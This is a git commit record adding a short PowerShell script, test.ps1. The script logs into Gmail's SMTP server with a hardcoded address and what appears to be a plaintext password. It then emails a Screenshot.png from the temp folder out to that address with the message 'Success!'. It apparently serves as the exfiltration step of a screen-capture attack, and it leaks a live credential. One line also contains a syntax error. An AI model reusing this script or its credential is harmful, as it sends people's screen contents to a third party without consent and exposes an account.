8df47c45b3f1fcc70c5bc885e6c4f2282441bd1b
AqStudio1 <zaghum.mughal.1@gmail.com>
2022-04-29 12:20:24 +0100

    Create test.ps1

---
+++ test.ps1
@@ -0,0 +1,11 @@
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('zaghum.mughal.1@gmail.com', ',.H@cked12,.')
+$message = New - Object System.Net.Mail.MailMessage
+$message.From = 'zaghum.mughal.1@gmail.com'
+$message.To.Add('zaghum.mughal.1@gmail.com')
+$message.Subject = 'Screenshot File'
+$message.Body = 'Success! The Screenshot file is attached!'
+$message.Attachments.Add("$ENV:temp\Screenshot.png");
+$SMTPInfo.Send($message);
